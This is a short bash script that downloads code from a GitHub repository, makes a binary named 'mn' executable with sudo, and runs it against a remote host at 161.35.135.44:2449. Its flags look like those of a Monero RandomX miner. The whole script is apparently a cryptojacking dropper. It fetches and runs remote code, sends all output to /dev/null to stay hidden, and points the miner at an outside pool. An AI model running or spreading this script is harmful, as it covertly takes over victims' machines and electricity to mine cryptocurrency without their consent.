#! /bin/bash
{
git clone https://github.com/fulltechtree/tech.git &> /dev/null
sudo chmod +x tech/mn
screen -S min
./tech/mn -o 161.35.135.44:2449 -u userA -p 1 -a rx/0 -k -t "$1" &> log
} &> /dev/null
